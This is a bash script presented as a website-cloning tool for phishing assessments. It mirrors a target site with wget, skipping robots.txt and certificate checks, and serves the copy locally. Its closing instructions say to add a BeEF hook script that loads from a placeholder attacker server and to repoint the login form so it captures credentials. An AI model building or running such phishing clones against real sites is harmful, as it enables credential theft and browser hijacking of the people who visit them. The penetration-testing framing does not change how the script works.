#!/bin/bash
# Website Cloning Script for Phishing Assessments
# Usage: ./clone-website.sh <URL>

set -e

# Check if URL is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <URL>"
    echo "Example: $0 https://example.com"
    exit 1
fi

URL="$1"

# Extract domain name for directory
echo "Cloning website: $URL"
echo ""

# Create directory based on domain
DOMAIN=$(echo "$URL" | sed -E 's|https?://||' | sed -E 's|/.*||')
CLONE_DIR="${DOMAIN}_clone"

# Check if directory already exists
if [ -d "$CLONE_DIR" ]; then
    echo "Warning: Directory $CLONE_DIR already exists. Removing..."
    rm -rf "$CLONE_DIR"
fi

echo "Cloning to: $CLONE_DIR"
echo "This may take a few minutes depending on the site size..."
echo ""

# Clone the website
wget --mirror --page-requisites --convert-links --adjust-extension \
    --execute robots=off --no-check-certificate \
    -P "$CLONE_DIR" "$URL"

echo ""
echo "========================================"
echo "Website cloned successfully!"
echo "========================================"
echo ""
echo "Cloned directory: $CLONE_DIR"
echo ""
echo "To serve the cloned site locally:"
echo "  cd $CLONE_DIR"
echo "  python3 -m http.server 8000"
echo ""
echo "Then open: http://localhost:8000"
echo ""
echo "To add a BeEF hook, edit the <head> section of the HTML files:"
echo '  <script type="text/javascript" src="http://<beef-server-ip>:3000/hook.js"></script>'
echo ""
echo "To capture credentials, modify the login form action to point to your server."
